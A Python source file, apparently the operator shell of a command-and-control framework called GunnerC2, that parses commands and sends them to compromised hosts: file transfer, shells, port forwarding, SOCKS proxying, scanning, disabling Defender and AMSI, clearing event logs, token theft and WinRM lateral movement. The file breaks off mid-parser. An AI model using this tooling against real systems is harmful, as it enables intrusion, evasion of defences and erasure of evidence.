import logging
logger = logging.getLogger(__name__)

from core.print_override import set_output_context
import shlex
import readline
import ntpath
import os, sys
import re
from core.module_loader import load_module, discover_module_files, search_modules, MODULE_DIR as BASE_MODULE_DIR
from core.session_handlers.session_manager import resolve_sid
from core.utils import print_help, print_gunnershell_help, gunnershell_commands
from core import shell, portfwd, utils
from core.session_handlers import session_manager
from core.banner import print_banner
from core.gunnershell.filesystem_master import *
from core.gunnershell import filesystem_master as filesystem
from core.gunnershell import network_master as net
from core.gunnershell import system_master as system
from core.gunnershell import userinterface_master as ui
from core.gunnershell import lateralmovement_master as lateral
from core.gunnershell import activedirectory_master as ad
from colorama import init, Fore, Style
from core.prompt_manager import prompt_manager

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
UNDERLINE_ON  = "\001\x1b[4m\002"
UNDERLINE_OFF = "\001\x1b[24m\002"
reset = Style.RESET_ALL

#MODULE_DIR = os.path.join(os.path.dirname(__file__), "modules")

MODULE_DIR = BASE_MODULE_DIR
MAIN_HISTORY = os.path.expanduser("~/.gunnerc2_history")

class QuietParser(argparse.ArgumentParser):
	def error(self, message):
		raise SystemExit


class Gunnershell:
	"""
	A Meterpreter-like subshell that can load and run Gunner modules against a session.
	Usage:
	  gs = Gunnershell(session_id)
	  gs.interact()
	"""
	def __init__(self, sid, op_id=None):
		logger.debug(brightblue + f"IN __INIT__ GUNNERSHELL FUNC WITH SID {sid} AS OP {op_id} ABOUT TO RESOLVE SID" + reset)
		real = resolve_sid(sid)
		if not real or real not in session_manager.sessions:
			logger.debug(brightred + f"INVALID SESSION {sid}" + reset)
			raise ValueError(brightred + f"Invalid session: {sid}")

		display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
		self.sid = real
		self.display = display
		self.MAIN_HIST = os.path.expanduser("~/.gunnerc2_history")
		SESSION_HIST = os.path.expanduser(f"~/.gunnerc2_gs_{self.sid}_history")
		self.SESSION_HIST = SESSION_HIST
		logger.debug(brightblue + "SUCCESSFULLY SET GUNNERSHELL HISTORY FILES" + reset) 

		
		self.session = session_manager.sessions[self.sid]
		prompt = f"{UNDERLINE_ON}{brightblue}GunnerShell{UNDERLINE_OFF} > "
		if not op_id:
			prompt_manager.set_prompt(prompt)
			self.prompt = prompt_manager.get_prompt()
		else:
			prompt_manager.set_prompt(prompt, op_id)
			self.prompt = prompt_manager.get_prompt(op_id)

		logger.debug(brightblue + f"SET GUNNERSHELL PROMPTS FOR SID {sid} AS OP {op_id}" + reset)

		# discover available modules once
		self.available = discover_module_files(MODULE_DIR)
		self.os_type = self.session.metadata.get("os","").lower()
		if op_id:
			logger.debug(brightblue + f"GETTING PWD WITH OP ID: {op_id}" + reset)
			self.cwd = pwd(self.sid, self.os_type, op_id=op_id) or ""

		else:
			logger.debug(brightblue + "GETTING PWD WITH MAIN C2 CONSOLE" + reset)
			self.cwd = pwd(self.sid, self.os_type, op_id="console") or ""

		if op_id:
			logger.debug(brightgreen + f"SUCCESSFULLY INITALIZED GUNNERSHELL FOR SID {sid} as OP {op_id}" + reset)

		else:
			logger.debug(brightgreen + f"SUCCESSFULLY INITALIZED GUNNERSHELL FOR SID {sid} as CONSOLE" + reset)

	def make_abs(self, p):
		"""
		Resolve p (which may be relative) against the current working
		directory (self.cwd), using the right path logic for windows/linux.
		"""
		

		# if it's already absolute, just return it
		if ("windows" in self.os_type and ntpath.isabs(p)) or \
		   ("linux"   in self.os_type and p.startswith("/")):
			return p

		base = self.cwd or ""
		joiner = ntpath if "windows" in self.os_type else self.os.path
		return joiner.normpath(joiner.join(base, p))


	def completer(self, text, state):
		# simple tab completion: modules and built-in commands
		try:
			builtins = list(gunnershell_commands.keys())
			options  = [c for c in self.available + builtins if c.startswith(text)]
			return options[state]

		except IndexError:
			pass

	def run_module(self, modname):
		"""
		Load and run a module by name, using default options from session metadata.
		"""
		module = load_module(modname)
		if not module:
			print(f"[!] Module not found: {modname}")
			return
		# auto-set common options if present
		meta = self.session.metadata
		for opt in ("sid", "session_id", "target", "host", "user"):  # example keys
			if opt in module.options and "sid" in module.options:
				module.set_option(opt, self.sid)
		missing = module.validate()
		if missing is not True:
			print(f"[!] Missing options: {', '.join(missing)}")
			return
		module.run()

	def interact(self, cmd, to_console=True, op_id=None):
		set_output_context(to_console=to_console, to_op=op_id, world_wide=False)
		#readline.set_completer(self.completer)
		#readline.parse_and_bind("tab: complete")

		if not op_id:
			op_id = "console"
		try:
			user = cmd
			try:
				parts = shlex.split(user.strip())

			except ValueError:
				print(brightred + "[!] No escaped character!")
				return

			if not user:
				return

			elif not parts:
				return

			try:
				cmd = parts[0]

			except Exception:
				return

			# exit subshell
			if cmd in ("exit", "quit", "back"):
				PROMPT = brightblue + "GunnerC2 > " + brightblue
				if not op_id:
					prompt_manager.set_prompt(PROMPT)
					self.prompt = prompt_manager.get_prompt()
				else:
					prompt_manager.set_prompt(PROMPT, op_id)
					self.prompt = prompt_manager.get_prompt(op_id)
				return "exit"

			# help
			elif cmd == "help":
				parts = user.split()

				# help
				if len(parts) == 1:
					out = print_gunnershell_help(to_console=to_console, op_id=op_id)
					if out:
						return out

					else:
						logger.debug("HELP OUTPUT NOT FOUND")

				# help <command>
				elif len(parts) == 2:
					print_gunnershell_help(parts[1])
					return

				# help <command> <subcommand>
				elif len(parts) == 3:
					print_gunnershell_help(f"{parts[1]} {parts[2]}")
					return

				else:
					print(brightyellow + "Usage: help or help <command> [subcommand]")
					return

				return

			elif cmd == "banner":
				os.system("clear")
				print_banner()
				return

			# list modules
			elif cmd == "list":
				print(brightgreen + "Available modules:")
				for m in self.available:
					print(brightgreen + f"  {m}")
				return

			elif cmd == "gunnerid":
				print(brightgreen + self.sid)
				return

			elif cmd == "sessions":
				utils.list_sessions()
				return

			elif cmd == "alias":
				parts = shlex.split(user)
				if len(parts) != 3:
					print(brightyellow + "Usage: alias <OLD_SID_or_ALIAS> <NEW_ALIAS>")
					return

				old, new = parts[1], parts[2]
				real = session_manager.resolve_sid(old)
				if not real:
					print(brightred + f"No such session or alias: {old}")
					return

				session_manager.set_alias(new, real)
				print(brightgreen + f"Alias set: {new!r} → {real}")

				old_display = old
				for entry in portforwards.values():
					if entry["sid"] == old_display:
						entry["sid"] = new

				return

			elif cmd == "switch":
				parts = shlex.split(user)
				if len(parts) != 2:
					print(brightyellow + "Usage: switch <session_id_or_alias>")
					return

				raw = parts[1]
				new_sid = resolve_sid(raw)
				if not new_sid or new_sid not in session_manager.sessions:
					print(brightred + f"No such session or alias: {raw}")
					return

				if new_sid == self.sid:
					print(brightyellow + f"Already in GunnerShell for session {self.display}")
					return

				display = next((a for a, rsid in session_manager.alias_map.items() if rsid == new_sid), new_sid)
				print(brightgreen + f"[*] Switching out of this subshell and into session {display}...")
				# return the new SID so the caller can re-spawn at top level
				return f"SIDSWITCH {new_sid}"

			elif cmd == "shelldefence":
				parts = user.split()
				try:
					if len(parts) != 2 or parts[1] not in ("on", "off"):
						print(brightyellow + "Usage: shelldefence <on|off>")
						return

					if parts[1] == "on":
						defender.is_active = True

					elif parts[1] == "off":
						defender.is_active = False

				except IndexError:
					print(brightyellow + "Usage: shelldefence <on|off>")
					return

				except Exception as e:
					print(brightred + f"[!] An unknown error has ocurred: {e}")
					return
				return

			# upload: upload <local> <remote>
			elif cmd == "upload":
				parts = shlex.split(user)
				if len(parts) != 3:
					print(brightyellow + "Usage: upload <local_path> <remote_path>")
					return

				else:
					local, remote = parts[1], parts[2]
					if session_manager.sessions[self.sid].transport in ("http", "https"):
						shell.upload_file_http(self.sid, local, remote)

					else:
						shell.upload_file_tcp(self.sid, local, remote)
				return

			# download: download <remote> <local>
			elif cmd == "download":
				parts = shlex.split(user)

				if len(parts) != 3:
					print(brightyellow + "Usage: download <remote_path> <local_path>")
					return

				else:
					remote, local = parts[1], parts[2]
					if session_manager.sessions[self.sid].transport in ("http", "https"):
						shell.download_file_http(self.sid, remote, local)

					else:
						shell.download_file_tcp(self.sid, remote, local)
				return

			# shell: drop into full interactive shell
			elif cmd == "shell":
				if session_manager.sessions[self.sid].transport in ("http","https"):
					shell.interactive_http_shell(self.sid)
				else:
					shell.interactive_tcp_shell(self.sid)
				return

			# modhelp: show a module’s options
			elif cmd == "modhelp":
				parts = shlex.split(user)
				if len(parts) != 2:
					print(brightyellow + "Usage: modhelp <module_name>")
					return
				else:
					modname = parts[1]
					module = load_module(modname)
					if module:
						print(brightyellow + f"Module: {module.name}\n")
						print(brightgreen + f"{module.description}\n")
						module.show_options()
				return

			elif cmd == "search":
				parts = shlex.split(user)
				if len(parts) != 2:
					print(brightyellow + "Usage: search <keyword>   or   search all")
					return

				else:
					term = parts[1]
					if term.lower() == "all":
						results = discover_module_files(MODULE_DIR)
					else:
						results = search_modules(term)

					if not results:
						print(brightred + f"No modules found matching '{term}'.")
					else:
						self.available = results
						print(brightgreen + f"Found {len(results)} modules:")
						for idx, m in enumerate(results, 1):
							print(brightgreen + f"  [{idx}] {m}")
				return

			# run: execute a module with inline key=val args
			elif cmd == "run":
				parts = shlex.split(user)
				if len(parts) < 2:
					print(brightyellow + "Usage: run <module_name> [KEY=VALUE ...]")
					return

				else:
					modname = parts[1]
					module = load_module(modname)
					if not module:
						return

					# parse key=val pairs
					for kv in parts[2:]:
						if "=" in kv:
							key, val = kv.split("=",1)
							try:
								module.set_option(key, val)
							except Exception:
								print(brightred + f"Unknown option '{key}'")
					missing = module.validate()
					if missing is True:
						module.run()
					else:
						print(brightred + "[!] Missing required options: " + ", ".join(missing))
				return

			elif cmd == "portfwd":
				parts = shlex.split(user)
				# must have at least: portfwd <subcommand>
				if len(parts) < 2 or parts[1] not in ("add","list","delete"):
					print(brightyellow + "Usage: portfwd <add|list|delete> [options]")
					return

				sub = parts[1]

				# portfwd list
				if sub == "list":
					from core.utils import list_forwards
					fwd = list_forwards()
					if not fwd:
						print(brightyellow + "No active port-forwards.")

					else:
						for rid, info in fwd.items():
							print(brightgreen + f"{rid}: {info['local_host']}:{info['local']} → {info['sid']} → {info['remote']}")
					return

				# portfwd delete -i <rule_id>
				if sub == "delete":
					if "-i" not in parts:
						print(brightyellow + "Usage: portfwd delete -i <rule_id>")

					else:
						rid = parts[parts.index("-i")+1]
						from core.utils import unregister_forward
						unregister_forward(rid)
						print(brightyellow + f"Removed forward {rid}")
					return

				# portfwd add -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
				if sub == "add":
					try:
						opts = dict(zip(parts[2::2], parts[3::2]))
						lh = opts["-lh"]
						lp = int(opts["-lp"])
						rh = opts["-rh"]
						rp = int(opts["-rp"])
						cp = int(opts["-cp"])

					except Exception:
						print(brightyellow + "Usage: portfwd add -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>")
						return

					# start the listener thread
					from core import portfwd as _pfwd
					import threading
					rid = str(len(utils.portforwards) + 1)
					sid = session_manager.resolve_sid(self.sid)
					t = threading.Thread(
						target=_pfwd.portfwd_listener,
						args=(rid, sid, lh, lp, rh, rp, cp),
						daemon=True
					)
					t.start()

					# register it so `list` can see it
					utils.register_forward(rid, self.sid, lh, lp, rh, rp, t, _pfwd.last_listener_socket)
					print(brightgreen + f"[+] Forward #{rid} {lh}:{lp} → {self.sid} → {rh}:{rp}")
					return

			#################################################################################################
			##################################File System Commands###########################################
			#################################################################################################
			#################################################################################################

			elif cmd == "ls" or cmd == "dir":
				try:
					parts = shlex.split(user)

				except ValueError:
					# fall back if they had an unescaped trailing backslash
					parts = user.split(maxsplit=1)

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return
					
				# 1) exactly "ls" → default to current dir
				if len(parts) == 1:
					target = self.cwd

				# 2) "ls <path>"
				elif len(parts) == 2:
					raw = parts[1]
					# on Linux: absolute if starts with "/"
					if "linux" in self.os_type and raw.startswith("/"):
						target = raw
					# on Windows: absolute if drive letter like "C:\"
					elif "windows" in self.os_type and ntpath.isabs(raw):
						target = raw
					else:
						if "windows" in self.os_type:
							# use ntpath so “..” works against a C:\ drive path
							combined = ntpath.join(self.cwd, raw)
							target   = ntpath.normpath(combined)
						else:
							combined = os.path.join(self.cwd, raw)
							target   = os.path.normpath(combined)

				# 3) too many args
				else:
					print(brightyellow + "Usage: ls [<path>]")
					return

				# on Windows, detect a root drive (e.g. "C:" or "C:\")
				is_root_drive = False
				if "windows" in self.os_type:
					if re.match(r'^[A-Za-z]:(\\)?$', target):
						is_root_drive = True

				if is_root_drive:
					# strip trailing slash so our closing quote isn't escaped
					safe = target.rstrip("\\/")
					cmd  = f"ls -force -path '{safe}'"
					# bypass the defender for root listings
					transport = self.session.transport.lower()
					if transport in ("tcp", "tls"):
						out = shell.run_command_tcp(self.sid,cmd,timeout=0.5,defender_bypass=True, op_id=op_id)

					elif transport in ("http", "https"):
						out = shell.run_command_http(self.sid, cmd, defender_bypass=True, op_id=op_id)

				else:
					out = ls(self.sid, self.os_type, target, op_id=op_id)

				if out:
					print(brightgreen + f"\n{out}")

				else:
					print(brightyellow + "[*] No output")
				return

			elif cmd == "pwd":
				cwd = pwd(self.sid, self.os_type, op_id=op_id)
				if cwd:
					print(brightgreen + cwd)

				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "cd":
				# split into exactly two tokens, but do NOT treat '\' as an escape
				parts = shlex.split(user, comments=False, posix=False)
				if len(parts) != 2:
					print(brightyellow + "Usage: cd <path>")
					return

				target = parts[1]
				new_cwd = cd(self.sid, self.os_type, target, op_id=op_id)

				if new_cwd:
					self.cwd = new_cwd
					print(brightgreen + new_cwd)

				else:
					print(brightred + f"[!] Failed to cd to '{target}'")
					return
				return

			elif cmd == "cat" or cmd == "type":
				parts = None
				try:
					parts = shlex.split(user, 1)
					raw = parts[1]

				except ValueError:
					# fallback if they had an unescaped trailing backslash
					parts = user.split(maxsplit=1)

				except Exception:
					if cmd == "cat":
						print(brightyellow + "Usage: cat <filepath>")

					else:
						print(brightyellow + "Usage: type <filepath>")
					return

				# require exactly one argument
				if len(parts) != 2:
					if cmd == "cat":
						print(brightyellow + "Usage: cat <filepath>")

					else:
						print(brightyellow + "Usage: type <filepath>")
					return

				# decide absolute vs relative
				if "linux" in self.os_type and raw.startswith("/"):
					target = raw

				elif "windows" in self.os_type and ntpath.isabs(raw):
					target = raw

				else:
					# relative → resolve against self.cwd
					if "windows" in self.os_type:
						joined = ntpath.join(self.cwd, raw)
						target = ntpath.normpath(joined)

					else:
						joined = os.path.join(self.cwd, raw)
						target = os.path.normpath(joined)

				# finally invoke remote cat
				out = cat(self.sid, self.os_type, target, op_id=op_id)
				if out:
					print(brightgreen + out)

				else:
					print(brightyellow + "[*] No output or file not found")
				return

			elif cmd == "cp":
				try:
					parts = shlex.split(user, 2)
					raw_src, raw_dst = parts[1], parts[2]

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 3:
					print(brightyellow + "Usage: cp <source> <destination>")
					return

				# both paths may be relative → join to cwd

				if raw_src and raw_dst:
					src = self.make_abs(raw_src)
					dst = self.make_abs(raw_dst)

				out = filesystem.cp(self.sid, self.os_type, src, dst, op_id=op_id)

				if out:
					print(brightgreen + out)

				else:
					print(brightyellow + "[*] Copy completed!")
				return

			elif cmd == "del" or cmd == "rm":
				try:
					parts = shlex.split(user, 1)
					raw = parts[1]
					verb = parts[0]

				except Exception as e:
					print(brightyellow + "Usage: del <path>  or  rm <path>")
					return

				if len(parts) != 2:
					print(brightyellow + "Usage: del <path>  or  rm <path>")
					return

				# if not absolute, join to cwd
					
				if raw:
					raw = self.make_abs(raw)

				out = delete(self.sid, self.os_type, raw, op_id=op_id)
				if out:
					print(brightgreen + out)

				else:
					print(brightyellow + f"[*] {verb} completed")
				return

			elif cmd == "mkdir" or cmd == "md":
				try:
					parts = shlex.split(user, 1)
					raw = parts[1]

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 2:
					print(brightyellow + "Usage: mkdir <path>  or  md <path>")
					return

				# resolve relative to cwd

				if raw:
					raw_path = self.make_abs(raw)

				else:
					print(brightred + f"[!] An unknown error ocurred!")
					return

				out = mkdir(self.sid, self.os_type, raw_path, op_id=op_id)
				if out:
					print(brightgreen + out)

				else:
					print(brightgreen + f"Created directory: {raw}")
				return

			# touch
			elif cmd == "touch":
				try:
					parts = shlex.split(user, 1)
					raw = parts[1]

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 2:
					print(brightyellow + "Usage: touch <path>")
					return

				raw = self.make_abs(raw)

				out = touch(self.sid, self.os_type, raw, op_id=op_id)

				if out:
					print(brightgreen + out)

				else:
					print(brightgreen + f"Created file: {raw} on compromised host {self.display}")
				return

			# — checksum —
			elif cmd == "checksum":
				try:
					parts = shlex.split(user, 1)
					raw = parts[1]

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 2:
					print(brightyellow + "Usage: checksum <path>")
					return

				# make raw absolute against cwd if it isn’t already
				raw = self.make_abs(raw)

				out = filesystem.checksum(self.sid, self.os_type, raw, op_id=op_id)
				if out:
					print(brightgreen + out)
				return


			elif cmd == "mv":
				try:
					parts = shlex.split(user)

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 3:
					print(brightyellow + "Usage: mv <src> <dst>")
					return

				raw_src, raw_dst = parts[1], parts[2]
				norm = ntpath if "windows" in self.os_type else os.path

				raw_src = self.make_abs(raw_src)
				raw_dst = self.make_abs(raw_dst)

				out = filesystem.mv(self.sid, self.os_type, raw_src, raw_dst, op_id=op_id)
				if out:
					print(brightgreen + out)
					return
				return


			# — rmdir (remove directory) —
			elif cmd == "rmdir":
				try:
					parts = shlex.split(user, 1)

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 2:
					print(brightyellow + "Usage: rmdir <path>")
					return

				raw = parts[1]
				
				raw = self.make_abs(raw)

				out = filesystem.rmdir(self.sid, self.os_type, raw, op_id=op_id)
				if out:
					print(brightgreen + out)
					return
				return

			elif cmd == "drives":
				out = filesystem.drives(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + f"\n{out}")
						
				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "edit":
				try:
					parts = shlex.split(user, 1)

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 2:
					print(brightyellow + "Usage: edit <path>")
					return

				raw = parts[1]

				# resolve relative → absolute against cwd
				raw = self.make_abs(raw)

				result = filesystem.edit(self.sid, self.os_type, raw, op_id=op_id)
				print(brightgreen + result)
				return


			#################################################################################################
			##################################Networking Commands############################################
			#################################################################################################
			#################################################################################################

			elif cmd == "netstat":
				out = net.netstat(self.sid, self.os_type, op_id=op_id)
				print(brightgreen + f"\n{out}")
				return

			elif cmd == "ipconfig" or cmd == "ifconfig":
				try:
					parts = shlex.split(user)

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 1:
					print(brightyellow + "Usage: ipconfig")
					return

				out = net.ipconfig(self.sid, self.os_type, op_id=op_id)

				if out:
					print(brightgreen + out)
				else:
					print(brightyellow + "[*] No output")
				return

			elif cmd == "arp":
				out = net.arp(self.sid, self.os_type, op_id=op_id)
				print(brightgreen + f"\n{out}")
				return

			elif cmd == "resolve" or cmd == "nslookup":
				try:
					parts = shlex.split(user, 1)
					host = parts[1]

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				out = net.resolve(self.sid, self.os_type, host, op_id=op_id)
				print(brightgreen + f"\n{out}")
				return

			elif cmd == "route":
				out = net.route(self.sid, self.os_type, op_id=op_id)
				print(brightgreen + f"\n{out}")
				return

			elif cmd == "getproxy":
				try:
					parts = shlex.split(user)

				except Exception as e:
					print(brightred + f"[!] We hit an error while parsing your command: {e}")
					return

				if len(parts) != 1:
					print(brightyellow + "Usage: getproxy")
					return

				out = net.getproxy(self.sid, self.os_type, op_id=op_id)

				if out:
					print(brightgreen + out)
				else:
					print(brightyellow + "[*] No proxy configuration found")
				return

			elif cmd == "portscan":
				parts = shlex.split(user)
				skip_ping = "-Pn" in parts
				# extract -p if present
				ports_arg = None
				if "-p-" in parts:
					ports_arg = "-"
					parts.remove("-p-")

				elif "-p" in parts:
					pi = parts.index("-p")
					try:
						ports_arg = parts[pi+1]
						parts.pop(pi+1)
						parts.pop(pi)

					except IndexError:
						print(brightyellow + "Usage: portscan [-Pn] [-p <ports> | -p-] <IP_or_subnet>")
						return

				# now what's left should be just the subnet/host
				args = [p for p in parts[1:] if p != "-Pn"]
				if len(args) != 1:
					print(brightyellow + "Usage: portscan [-Pn] [-p <ports>] <IP_or_subnet>")
					return

				target = args[0]
				out = net.portscan(self.sid, self.os_type, target,skip_ping=skip_ping, port_spec=ports_arg, op_id=op_id)
					
				if out:
					print(brightgreen + f"\n{out}")
				else:
					print(brightyellow + "[*] No output or scan failed")
				return

			elif cmd == "hostname":
				# simply grab the remote hostname
				out = net.hostname(self.sid, self.os_type, op_id=op_id)

				if out:
					if "[!]" in out:
						print(out)

					else:
						print(brightgreen + out.strip())

				else:
					print(brightyellow + "[*] No output")

				return


			elif cmd == "socks":
				parts = shlex.split(user)
				parser = QuietParser(prog="socks", add_help=False)
				parser.add_argument("-lh",  dest="lh", type=str, required=True, help="Local host/IP for agent to connect back to (your C2 IP)")
				parser.add_argument("-sp",  dest="sp", type=int, required=True, help="SOCKS port on your C2 (where proxychains will point)")
				parser.add_argument("-lp",  dest="lp", type=int, required=True, help="Local port on agent side to connect out from (source)")

				try:
					opts = parser.parse_args(parts[1:])

				except SystemExit:
					print(brightyellow + utils.gunnershell_commands["socks"])
					return

				# call into network_master
				net.socks_proxy(
					sid=self.sid,
					local_host=opts.lh,
					socks_port=opts.sp,
					local_port=opts.lp,
					op_id=op_id
				)
				return

			#################################################################################################
			##################################System Commands################################################
			#################################################################################################
			#################################################################################################

			elif cmd == "sysinfo":
				out = system.sysinfo(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + out)
				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "ps":
				out = system.ps(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + out)
				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "getuid" or cmd == "whoami":
				out = system.getuid(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + out)
				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "getprivs":
				out = system.getprivs(self.sid, self.os_type, op_id=op_id)           

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "groups":
				out = system.groups(self.sid, self.os_type, op_id=op_id)

				if out:
					if "[!]" not in out:
						print(brightgreen + out)

					else:
						print(out)
				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "getav":
				out = system.getav(self.sid, self.os_type, op_id=op_id)

				if out:
					print(brightgreen + out)

				else:
					print(brightyellow + "[*] No AV/EDR products detected or error")
				return

			elif cmd == "defenderoff":
				out = system.defenderoff(self.sid, self.os_type, op_id=op_id)
				
				if out:
					if "[!]" in out:
						print(out)

					else:
						print(brightgreen + out)

				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "amsioff":
				out = system.amsioff(self.sid, self.os_type, op_id=op_id)
				if out:
					if "[!]" in out:
						print(out)

					else:
						print(brightgreen + out)
				else:
					print(brightyellow + "[*] No output or error")
				return

			elif cmd == "getpid":
				out = system.getpid(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			# getenv: retrieve one or more env vars
			elif cmd == "getenv":
				parts = shlex.split(user)

				if len(parts) == 1:
					out = system.getenv(self.sid, self.os_type, op_id=op_id)

				else:
					vars_to_fetch = parts[1:]
					out = system.getenv(self.sid, self.os_type, *vars_to_fetch, op_id=op_id)

				if out:
					print(brightgreen + out)
				return

			elif cmd == "exec":
				parts = shlex.split(user)
				if len(parts) < 2:
					print(brightyellow + "Usage: exec <command> [args...]")
					return

				cmdparts = parts[1:]

				out = system.exec(self.sid, self.os_type, *cmdparts, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			# kill: terminate a PID
			elif cmd == "kill":
				parts = shlex.split(user)
				if len(parts) != 2:
					print(brightyellow + "Usage: kill <pid>")
					return

				pid = parts[1]

				out = system.kill(self.sid, self.os_type, pid, op_id=op_id)
				if out:
					print(out)
				return

			# getsid: show current Windows SID
			elif cmd == "getsid":
				out = system.getsid(self.sid, self.os_type, op_id=op_id)

				if out:
					print(brightgreen + out)
				return

			elif cmd == "clearev":
				parts = shlex.split(user)
				if len(parts) > 1:
					if (p in ("-f", "--force") for p in parts[1:]):
						force = True

				elif len(parts) > 1:
					if (p not in ("-f", "--force") for p in parts[1:]):
						print(brightyellow + f"Usage: clearev  OPTIONAL: -f or --force")

				else:
					force = False

				print(brightyellow + "[*] Clearing event logs (this may take a while)...")
				out = system.clearev(self.sid, self.os_type, force=force, op_id=op_id)

				if out:
					print(brightgreen + out)
				return

			# show remote local time
			elif cmd == "localtime":
				out = system.localtime(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			# reboot remote host
			elif cmd == "reboot":
				out = system.reboot(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			# pgrep: pattern
			elif cmd == "pgrep":
				parts = shlex.split(user, 1)
				if len(parts) != 2:
					print(brightyellow + "Usage: pgrep <pattern>")
					return

				pattern = parts[1]

				out = system.pgrep(self.sid, self.os_type, pattern, op_id=op_id)
				if out:
					print(brightgreen + out)

				else:
					print(brightyellow + f"[*] Cannot find matching process {pattern}")
				return

			# pkill: pattern
			elif cmd == "pkill":
				parts = shlex.split(user, 1)
				if len(parts) != 2:
					print(brightyellow + "Usage: pkill <pattern>")
					return

				pid = parts[1]

				out = system.pkill(self.sid, self.os_type, pid, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			elif cmd == "suspend":
				parts = shlex.split(user)
				if len(parts) != 2:
					print(brightyellow + "Usage: suspend <pid>")
					return

				pid = parts[1]
				out = system.suspend(self.sid, self.os_type, pid, op_id=op_id)
				print(brightgreen + out if out else brightred + f"[!] Failed to suspend {pid}")
				return

			elif cmd == "resume":
				parts = shlex.split(user)
				if len(parts) != 2:
					print(brightyellow + "Usage: resume <pid>")
					return

				pid = parts[1]
				out = system.resume(self.sid, self.os_type, pid, op_id=op_id)
				print(brightgreen + out if out else brightred + f"[!] Failed to resume {pid}")
				return

			elif cmd == "shutdown":
				parts = shlex.split(user)
				# shutdown [ -r | -h ]
				try:
					args = parts[1:]  # may be empty or ['-r'] or ['-h']

				except Exception:
					args = None
					pass

				out = system.shutdown(self.sid, self.os_type, *args, op_id=op_id)
				print(brightgreen + out if out else brightred + "[!] Shutdown failed")
				return

			elif cmd == "reg":
				parts = shlex.split(user, 4)
				if len(parts) < 3:
					print(brightyellow + "Usage: reg <query|get|set|delete> <hive>\\<path> [<name> <data>] [/s|/f]")
					return

				action = parts[1].lower()
				hive_path = parts[2].rstrip("\\")   # strip any trailing “\”

				# if there’s a backslash in hive_path it splits into hive/key_path,
				# otherwise key_path becomes an empty string
				if "\\" in hive_path:
					hive, key_path = hive_path.split("\\", 1)
				else:
					hive, key_path = hive_path, ""

				name_or_flag = parts[3] if len(parts) >= 4 else None
				data        = parts[4] if len(parts) == 5 else None

				out = system.reg(self.sid, self.os_type, action, hive, key_path, name_or_flag, data, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			elif cmd == "services":
				parts = shlex.split(user)
				if len(parts) < 2 or parts[1] not in ("list","start","stop","restart"):
					print(brightyellow + "Usage: services <list|start|stop|restart> [<service_name>]")
					return
 
				action = parts[1]
				svc = parts[2] if len(parts) == 3 else None
				out = system.services(self.sid, self.os_type, action, svc, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			# netusers: list local user accounts
			elif cmd == "netusers":
				out = system.netusers(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			# netgroups: list local group accounts
			elif cmd == "netgroups":
				out = system.netgroups(self.sid, self.os_type, op_id=op_id)
				if out:
					print(brightgreen + out)
				return

			elif cmd == "steal_token":
				parts = shlex.split(user)
				# show full help if no args or just "steal_token"
				if len(parts) < 2:
					print_gunnershell_help("steal_token")
					return

				# invoke the backend
				out = system.steal_token(self.sid, self.os_type, *parts[1:], op_id=op_id)

				if out:
					# if the handler returned usage or an argparse error, re-show detailed help
					if out.lower().startswith("usage:"):
						print_gunnershell_help("steal_token")
					else:
						# any other error or message
						print(brightyellow + out)
				else:
					# success: server’s up and payload is launching
					print(brightgreen + "[+] steal_token dispatched.")

				return

			#################################################################################################
			##################################User Interface Commands########################################
			#################################################################################################
			#################################################################################################

			elif cmd == "screenshot":
				parts = shlex.split(user)
				if len(parts) == 1:
					ui.screenshot(self.sid, op_id=op_id)   

				elif len(parts) == 2:
					ui.screenshot(self.sid, parts[1], op_id=op_id)

				else:
					print(brightyellow + "Usage: screenshot [<local_path>]")
					return
				return


			#################################################################################################
			##################################Lateral Movement Commands######################################
			#################################################################################################
			#################################################################################################

			elif cmd == "winrm":
				parts = shlex.split(user)
				parser = QuietParser(prog='winrm', add_help=False)
				parser.add_argument('-u', dest='username', required=True, help='Username for authentication')
